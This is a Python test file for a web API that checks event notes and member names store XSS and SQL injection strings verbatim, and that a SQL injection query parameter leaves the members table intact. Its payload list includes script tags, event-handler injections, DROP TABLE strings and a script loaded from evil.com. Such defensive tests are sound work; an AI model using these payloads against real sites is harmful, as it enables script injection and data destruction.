"""XSS / stored-content sanity tests.

The backend does not sanitize HTML in free-text fields — escaping happens
on the frontend (React escapes by default in JSX). These tests verify:

1. Hostile payloads are accepted by the API without errors.
2. The roundtrip is exact (no silent stripping that could mask issues).
3. There's no SQL injection vector via Pydantic + SQLAlchemy ORM.

If escaping is ever moved to the backend, these tests should be updated
to assert proper encoding.
"""
import pytest

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)></iframe>",
    "Robert'); DROP TABLE members;--",  # Little Bobby Tables
    "<script src='http://evil.com/x.js'></script>",
]


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", XSS_PAYLOADS, ids=lambda p: p[:30])
async def test_event_notes_field_accepts_and_preserves_hostile_payloads(
    client, seeded_data, payload
):
    """Event notes (free text) accept hostile payloads and return them verbatim."""
    admin_token = seeded_data["admin_token"]
    headers = {"Authorization": f"Bearer {admin_token}"}

    create_resp = await client.post(
        "/events",
        headers=headers,
        json={
            "season_id": str(seeded_data["current_season"].id),
            "title": "Test XSS",
            "event_type": "other",
            "start_at": "2026-06-01T20:00:00",
            "notes": payload,
            "visibility": "all",
        },
    )
    assert create_resp.status_code == 201, create_resp.text
    event = create_resp.json()
    assert event["notes"] == payload, "Payload was altered on storage/return"

    # Confirm round-trip on GET as well
    get_resp = await client.get(f"/events/{event['id']}", headers=headers)
    assert get_resp.status_code == 200
    assert get_resp.json()["notes"] == payload


@pytest.mark.asyncio
@pytest.mark.parametrize("payload", XSS_PAYLOADS, ids=lambda p: p[:30])
async def test_member_last_name_accepts_and_preserves_hostile_payloads(
    client, seeded_data, payload
):
    """Member last_name accepts hostile payloads (admin rename use case)."""
    admin_token = seeded_data["admin_token"]
    headers = {"Authorization": f"Bearer {admin_token}"}

    target_id = str(seeded_data["regular"].id)
    resp = await client.put(
        f"/members/{target_id}",
        headers=headers,
        json={"last_name": payload},
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["last_name"] == payload


@pytest.mark.asyncio
async def test_sql_injection_attempt_in_query_param_is_safe(client, seeded_data):
    """A SQLi attempt in a query param must not break the route."""
    admin_token = seeded_data["admin_token"]
    headers = {"Authorization": f"Bearer {admin_token}"}

    # path_prefix accepts any string and is used in a LIKE clause via ORM.
    resp = await client.get(
        "/api/admin/activity/recent",
        headers=headers,
        params={"path_prefix": "'; DROP TABLE members; --"},
    )
    assert resp.status_code == 200, resp.text

    # The members table should still exist.
    members_resp = await client.get("/members", headers=headers)
    assert members_resp.status_code == 200
    assert isinstance(members_resp.json(), list)
